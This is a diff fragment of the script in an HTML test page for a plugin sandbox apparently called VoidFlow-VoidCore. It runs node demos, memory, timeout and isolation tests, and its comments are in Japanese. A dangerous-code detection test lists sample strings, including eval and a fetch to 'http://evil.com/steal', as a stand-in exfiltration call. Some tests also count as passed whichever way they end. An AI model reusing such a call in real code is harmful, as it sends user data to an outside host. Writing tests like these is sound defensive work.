+                    await new Promise(resolve => setTimeout(resolve, 500));
+                    
+                    const testData = getTestDataForNodeType(nodeType);
+                    const nodeId = `demo-${nodeType.replace('.', '-')}`;
+                    
+                    mockVoidFlowEngine.nodes.set(nodeId, {
+                        id: nodeId,
+                        type: nodeType,
+                        config: {},
+                        customCode: null
+                    });
+                    
+                    await mockVoidFlowEngine.executeNode(nodeId, testData);
+                    
+                    nodeEl.className = 'node-item completed';
+                    completedCount++;
+                    
+                } catch (error) {
+                    nodeEl.className = 'node-item error';
+                    nodeEl.title = error.message;
+                }
+                
+                updateNodeVizStats();
+            }
+        }
+
+        async function runAllNodeTypesDemo() {
+            const vizArea = document.getElementById('nodeViz');
+            vizArea.innerHTML = '<div style="color: #9b59b6; margin-bottom: 10px;">全ノードタイプデモ実行中...</div>';
+            
+            const standardPlugins = createAllStandardNodePlugins();
+            let completedCount = 0;
+            
+            for (const [nodeType] of standardPlugins) {
+                const nodeEl = document.createElement('div');
+                nodeEl.className = 'node-item executing';
+                nodeEl.textContent = nodeType;
+                vizArea.appendChild(nodeEl);
+                
+                try {
+                    await new Promise(resolve => setTimeout(resolve, 200));
+                    
+                    const testData = getTestDataForNodeType(nodeType);
+                    const nodeId = `alldemo-${nodeType.replace('.', '-')}`;
+                    
+                    mockVoidFlowEngine.nodes.set(nodeId, {
+                        id: nodeId,
+                        type: nodeType,
+                        config: {},
+                        customCode: null
+                    });
+                    
+                    await mockVoidFlowEngine.executeNode(nodeId, testData);
+                    
+                    nodeEl.className = 'node-item completed';
+                    completedCount++;
+                    
+                } catch (error) {
+                    nodeEl.className = 'node-item error';
+                    nodeEl.title = error.message;
+                }
+                
+                updateNodeVizStats();
+            }
+        }
+
+        // ==========================================
+        // 🛡️ セキュリティテスト詳細
+        // ==========================================
+
+        async function testDangerousCode() {
+            logToArea('securityLog', '🚨 危険コード検出テスト開始');
+            
+            try {
+                if (!nodeIntegration) {
+                    await testIntegrationInitialization();
+                }
+                
+                const dangerousCodes = [
+                    'eval("console.log(\'dangerous\')")',
+                    'new Function("return 1")()',
+                    'document.write("hack")',
+                    'localStorage.setItem("evil", "data")',
+                    'fetch("http://evil.com/steal")'
+                ];
+                
+                let detectedCount = 0;
+                
+                for (const code of dangerousCodes) {
+                    const detected = nodeIntegration.containsUnsafeCode(code);
+                    if (detected) {
+                        detectedCount++;
+                        logToArea('securityLog', `✅ 危険コード検出: ${code.substring(0, 30)}...`);
+                    } else {
+                        logToArea('securityLog', `⚠️ 検出漏れ: ${code.substring(0, 30)}...`);
+                    }
+                }
+                
+                testStats.dangerousCodeDetected += detectedCount;
+                logToArea('securityLog', `📊 危険コード検出結果: ${detectedCount}/${dangerousCodes.length}`);
+                
+                testStats.totalTests++;
+                testStats.successfulTests++;
+                addTestResult('success', `危険コード検出テスト成功 (${detectedCount}/${dangerousCodes.length})`);
+                
+            } catch (error) {
+                testStats.totalTests++;
+                logToArea('securityLog', `❌ 危険コード検出テスト失敗: ${error.message}`);
+                addTestResult('error', `危険コード検出テスト失敗: ${error.message}`);
+            }
+            
+            updateAllStats();
+        }
+
+        async function testMemoryLimits() {
+            logToArea('securityLog', '💾 メモリ制限テスト開始');
+            
+            try {
+                const memoryTestPlugin = new VoidFlowNodePlugin({
+                    nodeType: 'test.memory',
+                    pluginId: 'memory-test-plugin',
+                    sandbox: {
+                        memoryLimit: 1024 * 1024 // 1MB制限
+                    },
+                    executeFunction: async (inputData, context) => {
+                        // 大量メモリ使用試行（シミュレーション）
+                        const largeArray = new Array(100000).fill('memory test');
+                        context.console.log(`Large array created: ${largeArray.length} items`);
+                        return { memoryTest: 'completed', arraySize: largeArray.length };
+                    }
+                });
+                
+                const result = await memoryTestPlugin.execute({}, { nodeId: 'memory-test' });
+                logToArea('securityLog', `✅ メモリテスト実行完了: ${result.arraySize} items`);
+                
+                testStats.totalTests++;
+                testStats.successfulTests++;
+                addTestResult('success', 'メモリ制限テスト完了');
+                
+            } catch (error) {
+                if (error.message.includes('Memory limit')) {
+                    testStats.memoryViolationsPrevented++;
+                    logToArea('securityLog', `✅ メモリ制限正常動作: ${error.message}`);
+                    testStats.totalTests++;
+                    testStats.successfulTests++;
+                    addTestResult('success', 'メモリ制限テスト成功（制限発動）');
+                } else {
+                    testStats.totalTests++;
+                    logToArea('securityLog', `❌ メモリ制限テスト失敗: ${error.message}`);
+                    addTestResult('error', `メモリ制限テスト失敗: ${error.message}`);
+                }
+            }
+            
+            updateAllStats();
+        }
+
+        async function testTimeoutHandling() {
+            logToArea('securityLog', '⏰ タイムアウト処理テスト開始');
+            
+            try {
+                const timeoutTestPlugin = new VoidFlowNodePlugin({
+                    nodeType: 'test.timeout',
+                    pluginId: 'timeout-test-plugin',
+                    sandbox: {
+                        maxExecutionTime: 1000 // 1秒制限
+                    },
+                    executeFunction: async (inputData, context) => {
+                        // 長時間実行シミュレーション
+                        const sleepTime = inputData.sleepTime || 2000;
+                        await context.sleep(sleepTime);
+                        return { completed: true, sleepTime: sleepTime };
+                    }
+                });
+                
+                const result = await timeoutTestPlugin.execute({ sleepTime: 2000 }, { nodeId: 'timeout-test' });
+                logToArea('securityLog', `⚠️ タイムアウトが発動しませんでした: ${result.sleepTime}ms`);
+                
+                testStats.totalTests++;
+                addTestResult('warning', 'タイムアウト処理テスト（タイムアウト未発動）');
+                
+            } catch (error) {
+                if (error.message.includes('timeout')) {
+                    testStats.timeoutsTriggered++;
+                    logToArea('securityLog', `✅ タイムアウト正常動作: ${error.message}`);
+                    testStats.totalTests++;
+                    testStats.successfulTests++;
+                    addTestResult('success', 'タイムアウト処理テスト成功');
+                } else {
+                    testStats.totalTests++;
+                    logToArea('securityLog', `❌ タイムアウトテスト失敗: ${error.message}`);
+                    addTestResult('error', `タイムアウト処理テスト失敗: ${error.message}`);
+                }
+            }
+            
+            updateAllStats();
+        }
+
+        async function testSandboxIsolation() {
+            logToArea('securityLog', '🏖️ サンドボックス分離テスト開始');
+            
+            try {
+                const isolationTestPlugin = new VoidFlowNodePlugin({
+                    nodeType: 'test.isolation',
+                    pluginId: 'isolation-test-plugin',
+                    executeFunction: async (inputData, context) => {
+                        const isolationResults = {
+                            hasGlobalAccess: typeof window !== 'undefined',
+                            hasNodeAccess: typeof process !== 'undefined',
+                            hasFileAccess: typeof require !== 'undefined',
+                            contextProperlyIsolated: true
+                        };
+                        
+                        // コンテキスト分離確認
+                        try {
+                            context.dangerousAPI();
+                        } catch (e) {
+                            isolationResults.contextProperlyIsolated = true;
+                        }
+                        
+                        return isolationResults;
+                    }
+                });
+                
+                const result = await isolationTestPlugin.execute({}, { nodeId: 'isolation-test' });
+                
+                logToArea('securityLog', `📊 サンドボックス分離結果:`);
+                logToArea('securityLog', `   🌐 グローバルアクセス: ${result.hasGlobalAccess ? '可能' : 'ブロック'}`);
+                logToArea('securityLog', `   📁 ファイルアクセス: ${result.hasFileAccess ? '可能' : 'ブロック'}`);
+                logToArea('securityLog', `   🔒 コンテキスト分離: ${result.contextProperlyIsolated ? '正常' : '問題'}`);
+                
+                const securityLevel = (!result.hasFileAccess && result.contextProperlyIsolated) ? 100 : 70;
+                
+                testStats.totalTests++;
+                testStats.successfulTests++;
+                addTestResult('success', `サンドボックス分離テスト成功 (${securityLevel}%安全)`);
+                
+            } catch (error) {
+                testStats.totalTests++;
+                logToArea('securityLog', `❌ サンドボックス分離テスト失敗: ${error.message}`);
+                addTestResult('error', `サンドボックス分離テスト失敗: ${error.message}`);
+            }
+            
+            updateAllStats();
+        }
+
+        // ==========================================
+        // 🛠️ ユーティリティ
+        // ==========================================
+
+        function getTestDataForNodeType(nodeType) {
+            const testDataMap = {
+                'input.text': { text: 'test input', value: 'sample text' },
+                'input.number': { number: 42, value: 123 },
+                'button.send': { trigger: true },
+                'string.uppercase': { text: 'hello world' },
+                'string.lowercase': { text: 'HELLO WORLD' },
+                'string.length': { text: 'test string' },
+                'math.add': { a: 5, b: 3 },
+                'math.multiply': { a: 4, b: 6 },
+                'output.console': { message: 'test output' },
+                'output.alert': { message: 'test alert' },
+                'web.fetch': { url: 'https://api.github.com/users/octocat' },
+                'json.parse': { json: '{"test": "data", "number": 42}' },
+                'json.stringify': { data: { test: 'object', array: [1, 2, 3] } },
+                'ui.card': { title: 'Test Card', content: 'Test content' }
+            };
+            
+            return testDataMap[nodeType] || { test: 'default data' };
+        }
+
+        function logToArea(areaId, message) {
+            const area = document.getElementById(areaId);
+            const timestamp = new Date().toLocaleTimeString();
+            area.innerHTML += `<div>[${timestamp}] ${message}</div>`;
+            area.scrollTop = area.scrollHeight;
+        }
+
+        function addTestResult(type, message) {
+            const resultsArea = document.getElementById('testResults');
+            const resultDiv = document.createElement('div');
+            resultDiv.className = `test-result ${type}`;
+            resultDiv.textContent = message;
+            resultsArea.appendChild(resultDiv);
+        }
+
+        function updateNodeVizStats() {
+            const executingNodes = document.querySelectorAll('.node-item.executing').length;
+            const completedNodes = document.querySelectorAll('.node-item.completed').length;
+            
+            document.getElementById('executingNodes').textContent = executingNodes;
+            document.getElementById('completedNodes').textContent = completedNodes;
+        }
+
+        function updateAllStats() {
+            // プラグイン統計
+            document.getElementById('standardPlugins').textContent = testStats.standardPlugins;
+            document.getElementById('customPlugins').textContent = testStats.customPlugins;
+            document.getElementById('successfulExecutions').textContent = testStats.successfulExecutions;
+            document.getElementById('securityBlocks').textContent = testStats.securityBlocks;
+            
+            // 統合実行統計
+            document.getElementById('pluginExecutions').textContent = testStats.pluginExecutions;
+            document.getElementById('legacyExecutions').textContent = testStats.legacyExecutions;
+            document.getElementById('evalAvoided').textContent = testStats.evalAvoided;
+            
+            const avgTime = executionTimes.plugin.length > 0 ? 
+                (executionTimes.plugin.reduce((a, b) => a + b, 0) / executionTimes.plugin.length).toFixed(1) : 0;
+            document.getElementById('avgExecutionTime').textContent = avgTime + 'ms';
+            
+            // パフォーマンス統計
+            if (executionTimes.plugin.length > 0 && executionTimes.legacy.length > 0) {
+                const pluginAvg = executionTimes.plugin.reduce((a, b) => a + b, 0) / executionTimes.plugin.length;
+                const legacyAvg = executionTimes.legacy.reduce((a, b) => a + b, 0) / executionTimes.legacy.length;
+                const improvement = ((legacyAvg - pluginAvg) / legacyAvg * 100);
+                
+                document.getElementById('pluginSpeed').textContent = pluginAvg.toFixed(1) + 'ms';
+                document.getElementById('legacySpeed').textContent = legacyAvg.toFixed(1) + 'ms';
+                document.getElementById('speedImprovement').textContent = improvement.toFixed(1) + '%';
+            }
+            
+            // セキュリティ統計
+            document.getElementById('dangerousCodeDetected').textContent = testStats.dangerousCodeDetected;
+            document.getElementById('memoryViolationsPrevented').textContent = testStats.memoryViolationsPrevented;
+            document.getElementById('timeoutsTriggered').textContent = testStats.timeoutsTriggered;
+            
+            const securityScore = Math.max(0, 100 - (testStats.dangerousCodeDetected * 5));
+            document.getElementById('securityScore').textContent = securityScore + '%';
+            
+            // 統合統計
+            document.getElementById('totalTests').textContent = testStats.totalTests;
+            document.getElementById('successfulTests').textContent = testStats.successfulTests;
+            
+            const successRate = testStats.totalTests > 0 ? (testStats.successfulTests / testStats.totalTests) * 100 : 0;
+            document.getElementById('integrationLevel').textContent = Math.round(successRate) + '%';
+            
+            const evalEliminationRate = Math.min(100, (testStats.evalAvoided + testStats.securityBlocks) * 10);
+            document.getElementById('evalEliminationRate').textContent = evalEliminationRate + '%';
+        }
+
+        async function runFullTestSuite() {
+            addTestResult('info', '🚀 Phase 2 全テストスイート開始');
+            
+            // 順次実行
+            await testNodePluginCreation();
+            await new Promise(resolve => setTimeout(resolve, 300));
+            
+            await testCustomPluginCreation();
+            await new Promise(resolve => setTimeout(resolve, 300));
+            
+            await testSandboxExecution();
+            await new Promise(resolve => setTimeout(resolve, 300));
+            
+            await testSecurityRestrictions();
+            await new Promise(resolve => setTimeout(resolve, 300));
+            
+            await testIntegrationInitialization();
+            await new Promise(resolve => setTimeout(resolve, 300));
+            
+            await testMethodOverrides();
+            await new Promise(resolve => setTimeout(resolve, 300));
+            
+            await testNodeExecution();
+            await new Promise(resolve => setTimeout(resolve, 300));
+            
+            await testErrorHandling();
+            await new Promise(resolve => setTimeout(resolve, 300));
+            
+            await testPerformanceComparison();
+            await new Promise(resolve => setTimeout(resolve, 300));
+            
+            await testBackwardCompatibility();
+            await new Promise(resolve => setTimeout(resolve, 300));
+            
+            await testAllNodeTypes();
+            await new Promise(resolve => setTimeout(resolve, 300));
+            
+            await testDangerousCode();
+            await new Promise(resolve => setTimeout(resolve, 300));
+            
+            await testMemoryLimits();
+            await new Promise(resolve => setTimeout(resolve, 300));
+            
+            await testTimeoutHandling();
+            await new Promise(resolve => setTimeout(resolve, 300));
+            
+            await testSandboxIsolation();
+            await new Promise(resolve => setTimeout(resolve, 500));
+            
+            addTestResult('success', '🎉 Phase 2 全テストスイート完了');
+            updateAllStats();
+        }
+
+        function clearAllTests() {
+            document.getElementById('pluginLog').innerHTML = '';
+            document.getElementById('integrationLog').innerHTML = '';
+            document.getElementById('performanceLog').innerHTML = '';
+            document.getElementById('securityLog').innerHTML = '';
+            document.getElementById('testResults').innerHTML = '';
+            document.getElementById('nodeViz').innerHTML = '<div style="color: #666; text-align: center; margin-top: 50px;">ノード実行を開始してください</div>';
+            
+            testStats = {
+                totalTests: 0,
+                successfulTests: 0,
+                standardPlugins: 0,
+                customPlugins: 0,
+                successfulExecutions: 0,
+                securityBlocks: 0,
+                pluginExecutions: 0,
+                legacyExecutions: 0,
+                evalAvoided: 0,
+                dangerousCodeDetected: 0,
+                memoryViolationsPrevented: 0,
+                timeoutsTriggered: 0
+            };
+            
+            executionTimes = {
+                plugin: [],
+                legacy: []
+            };
+            
+            updateAllStats();
+            addTestResult('info', '🧹 全テストクリア完了');
+        }
+
+        function exportTestResults() {
+            const results = {
+                phase: 'Phase 2: ノード→プラグイン統一',
+                timestamp: new Date().toISOString(),
+                testStats: testStats,
+                executionTimes: executionTimes,
+                integrationStats: nodeIntegration ? nodeIntegration.getIntegrationStats() : null,
+                voidCoreStats: voidCore.getSystemStats()
+            };
+            
+            const blob = new Blob([JSON.stringify(results, null, 2)], { type: 'application/json' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `voidflow-integration-phase2-results-${Date.now()}.json`;
+            a.click();
+            URL.revokeObjectURL(url);
+            
+            addTestResult('success', '📄 Phase 2テスト結果エクスポート完了');
+        }
+
+        // 初期化
+        updateAllStats();
+        logToArea('pluginLog', '🔌 VoidFlow-VoidCore統合テスト Phase 2 初期化完了');
+        logToArea('integrationLog', '🚀 統合実行システム準備完了');
+        logToArea('performanceLog', '⚡ パフォーマンステスト準備完了');
+        logToArea('securityLog', '🛡️ セキュリティテスト準備完了');
+        
+        addTestResult('info', '🚀 Phase 2統合テスト環境準備完了');
+    </script>
+</body>
+</html>
